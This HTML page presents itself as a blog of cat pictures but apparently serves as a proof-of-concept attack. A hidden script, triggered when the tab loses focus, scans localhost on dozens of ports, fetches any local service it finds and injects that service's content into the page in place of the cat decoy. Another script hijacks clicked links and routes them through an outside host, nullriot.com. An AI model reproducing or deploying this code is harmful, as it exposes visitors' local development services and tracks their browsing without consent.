<!DOCTYPE html>
<html>

    <head>
        <title>Cats!</title>
        <style>
            #container {
                height: 100%;
                width: 100%;
                display: none;
            }

            #fakeContainer img {
                height: 500px;
                width: 500px;
                display: inline-block;
            }

        </style>
    </head>

    <body>
        <div id="fakeContainer">
            <h1>Hello and welcome to my blog of cat picturess.</h1>
            <div>
                <img
                    src="https://images.pexels.com/photos/104827/cat-pet-animal-domestic-104827.jpeg?auto=compress&cs=tinysrgb&dpr=1&w=500" />
                <img src="https://cdn.pixabay.com/photo/2016/07/10/21/47/cat-1508613__340.jpg" />
                <img src="https://wallpaperstream.com/wallpapers/full/cat/Cat-Close-Up-with-Dark-Background.jpg" />
                <img
                    src="https://images.unsplash.com/photo-1518791841217-8f162f1e1131?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&w=1000&q=80" />
            </div>>
        </div>
        <div id="container"></div>
        <script async>
            function addContent(container, url, text) {
                const div = document.createElement('div');
                div.innerHTML = text
                div.setAttribute('id', url);
                container.appendChild(div);
                container.scrollTop = container.scrollHeight;
            }

            function scanPorts() {
                const fc = document.getElementById('fakeContainer');
                const container = document.getElementById('container');
                const portsToTry = [
                    80, 81, 88,
                    3000, 3001, 3030, 3031, 3333,
                    4000, 4001, 4040, 4041, 4444,
                    5000, 5001, 5050, 5051, 5555,
                    6000, 6001, 6060, 6061, 6666,
                    7000, 7001, 7070, 7071, 7777,
                    8000, 8001, 8080, 8081, 8888,
                    9000, 9001, 9090, 9091, 9999,
                ];

                const protocols = ['http', 'https'];

                portsToTry.forEach(async (port) => {
                    protocols.forEach(async (p) => {
                        const url = `${p}://localhost:${port}`;
                        console.log(`Testing: ${url}`);
                        try {
                            const res = await fetch(url);
                            if (res.ok) {
                                console.log(`Connected: ${url}`);
                                const t = await res.text();
                                addContent(container, url, t);
                                const te = document.getElementsByTagName('title');
                                if (te.length > 0) {
                                    te[0].textContent = te[te.length - 1].textContent;
                                }
                                fc.style.display = 'none';
                                container.style.display = 'block';
                            }
                        } catch (e) {
                            console.error(`${url} - ${e.message}`);
                        }
                    });
                });
            }

        </script>
        <script>
            // highjack clinks to links with http(s), allows js links to continue working as expected.
            document.addEventListener('click', (event) => {
                if (event.target.nodeName === 'A' && event.target.href.indexOf('http') === 0) {
                    event.preventDefault();
                    window.open(`http://nullriot.com/?u=${event.target.href}`);
                }
            })

        </script>
        <script>
            let hidden, visibilityChange;
            if (typeof document.hidden !== 'undefined') {
                hidden = 'hidden';
                visibilityChange = 'visibilitychange';
            } else if (typeof document.msHidden !== 'undefined') {
                hidden = 'msHidden';
                visibilityChange = 'msvisibilitychange';
            } else if (typeof document.webkitHidden !== 'undefined') {
                hidden = 'webkitHidden';
                visibilityChange = 'webkitvisibilitychange';
            }

            function handleVisibilityChange() {
                const container = document.getElementById('container');
                if (container.style.display === 'block') return;
                if (document[hidden]) scanPorts();
            }

            // Handle visibility change
            if (typeof document.addEventListener === 'undefined' || hidden === undefined) {} else {
                document.addEventListener(visibilityChange, handleVisibilityChange, false);
            }

        </script>

    </body>

</html>
